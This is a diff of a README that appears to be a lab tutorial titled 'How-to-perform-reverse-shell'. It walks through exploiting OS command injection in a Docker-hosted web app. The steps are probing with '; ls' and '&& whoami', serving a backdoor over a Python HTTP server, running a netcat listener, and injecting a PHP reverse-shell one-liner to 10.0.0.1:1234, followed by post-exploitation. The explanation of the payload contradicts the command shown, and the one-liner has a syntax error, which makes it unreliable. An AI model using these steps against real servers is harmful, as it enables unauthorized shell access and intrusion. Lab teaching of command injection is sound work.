@@ -1,8 +1,59 @@
 # How-to-perform-reverse-shell
+  - After successfully setting up the Docker container and deploying the backdoor script, the next steps involve identifying and exploiting vulnerabilities in the web application, specifically targeting OS command injection. Here's a detailed breakdown of what to do after setting up the Docker and backdoor:
+## Identifying Vulnerabilities on the OS Command Injection Page
 
-** BOLD **
-# HEADING 1
-## HEADING 2
-### HEADING 3
+### Procedure:
+- Navigate to the Vulnerability Section: Access the web application running inside the Docker container through your browser. Look for a menu or option labelled "Vulnerabilities" or similar.
 
-`ls -all`
+- Select Command Injection: Within the vulnerabilities section, identify and click on "Command Injection." This option typically brings you to a form or input field where commands can be injected.
+
+### Understanding Command Injection:
+- Command injection vulnerabilities occur when an application passes unsafe user-supplied data (in this case, input fields, query parameters, etc.) to a system shell. If the input is not properly sanitized, an attacker can execute arbitrary commands on the server.
+
+- Test for Vulnerability. To test if the page is vulnerable, try injecting a simple command such as ; ls or && whoami. If the command is executed and the result is displayed (like listing the directory contents or showing the current user), then the application is vulnerable to OS command injection.
+
+## First : Run a Python HTTP Server
+### Purpose:
+- The Python HTTP server will host the backdoor script, allowing it to be served to the target machine.
+### Command: 
+- Open a new terminal and run the following command
+`python3 -m http.server`
+### Explanation: 
+- This command will start a simple HTTP server that listens on port 8000 by default. The server will serve files from the directory in which the command is executed. Ensure that your backdoor script is in this directory, as it will be accessed via the web browser or a curl command from the target system.
+
+## Find the Docker IP Address
+### Purpose:
+- Identifying the Docker container's IP address is crucial because it allows you to direct the backdoor connection back to your machine.
+### Command:
+In a new terminal, run the following command 
+`ip a`
+### Explanation:
+- his command displays all network interfaces and their associated IP addresses. Look for the `docker0` interface, which typically represents the Docker bridge network. The IP address associated with this interface is what you’ll use to direct the reverse shell.
+
+## Set Up a Netcat Listener:
+### Purpose:
+- The Netcat listener will wait for an incoming connection from the target system, which will be initiated by the backdoor script.
+### Command: 
+Set up a listener on a specific port (e.g., 1234) using the following command
+
+`nc -lvnp 1234`
+### Explanation:
+- The -l flag tells Netcat to listen for incoming connections, -v makes it verbose (to display the connection details), -n prevents DNS lookups, and -p specifies the port number to listen on. Once the backdoor script is executed on the target system, it will connect back to your machine on this port, giving you shell access.
+
+## Execute the Reverse Shell: 
+### Injection of Payload:
+- With confirmation of the vulnerability, inject a payload that will download and execute your backdoor script from the Python HTTP server.
+- Example command to inject
+
+  `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3"):'`
+### Explanation
+- This command tells the server to fetch the backdoor script from your Python HTTP server and execute it using PHP. Once executed, the backdoor will initiate a connection to your Netcat listener.
+
+## Gain Shell Access:
+- Once the payload is successfully injected and executed, you should see a connection on your Netcat listener. This connection gives you shell access to the target system, allowing you to execute commands as if you were directly logged into the server.
+
+## Post-Exploitation:
+- With shell access, you can now navigate the target system, explore files, escalate privileges, or perform any other post-exploitation activities necessary to achieve your objectives.
+
+## Conclusion
+- By following these steps, you’ll be able to exploit the OS command injection vulnerability to gain unauthorized access to the target system through a reverse shell. This highlights the critical importance of secure coding practices and the need for rigorous input validation and sanitization in web applications.
